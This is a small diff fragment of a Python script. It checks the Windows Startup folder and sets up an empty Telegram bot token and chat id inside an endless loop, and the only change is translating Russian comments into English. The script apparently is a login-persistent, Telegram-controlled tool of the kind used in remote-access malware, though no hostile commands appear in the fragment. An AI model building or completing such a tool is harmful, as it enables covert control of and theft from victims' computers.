@@ -52,8 +52,8 @@ if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start
 
 while True:
     try:
-        token = '' # ТОКЕН БОТА СЮДА !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-        chat_id = '' # Чат АЙДИ
+        token = '' # bot token   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+        chat_id = '' # chat id 
 
 
 
